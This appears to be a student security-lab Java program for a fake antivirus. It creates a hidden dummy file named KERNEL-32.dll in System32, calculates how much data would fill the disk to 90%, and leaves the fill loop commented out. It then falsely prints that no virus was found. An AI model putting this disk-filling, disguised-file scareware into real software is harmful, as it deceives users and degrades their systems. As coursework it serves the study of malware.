package csci476.lab3;
import java.io.*;
import java.nio.file.*;
import static java.nio.file.Files.newOutputStream;
import static java.nio.file.StandardOpenOption.CREATE_NEW;

public class Main {

    public static void main(String[] args) throws IOException {
	// write your code here
        File rootDrive = new File("/Windows/System32");
        //set the rootDrive to be System32, i have %systemroot% that way because I assume that will work
        long rootDriveTotalSize = rootDrive.getTotalSpace();
        //retrieves the total space of System 32
        long rootDriveFillableSize = (long)(rootDriveTotalSize*.90)-rootDrive.getUsableSpace();
        //calculates 90% of space of drive and removes free space so you get the amount of space needed to make the drive 90% full.
        byte one = 1;
        Path dllPath = Paths.get("/Windows/System32/KERNEL-32.dll");
        try (OutputStream out = new BufferedOutputStream(
                Files.newOutputStream(dllPath, CREATE_NEW))) {

        } catch (IOException x) {
            System.err.println(x);
        }
        Files.setAttribute(dllPath, "dos:hidden",true);

        //create hidden dummy .dll file KERNEL-32.dll
        //make that file hidden.


        System.out.println("Tota disk size: "+ rootDriveTotalSize);
        System.out.println("Usable space: "+ rootDrive.getUsableSpace());
        System.out.println("size to be filled up: " + rootDriveFillableSize);
        //The above three lines are for debugging.



        /*
        while(dummyDLL.length() < rootDriveFillableSize){

            //add one to the file.
        }
        */


        System.out.println("The scanning finished and no virus is found!");
        //tell the user they have no viruses.
    }
}
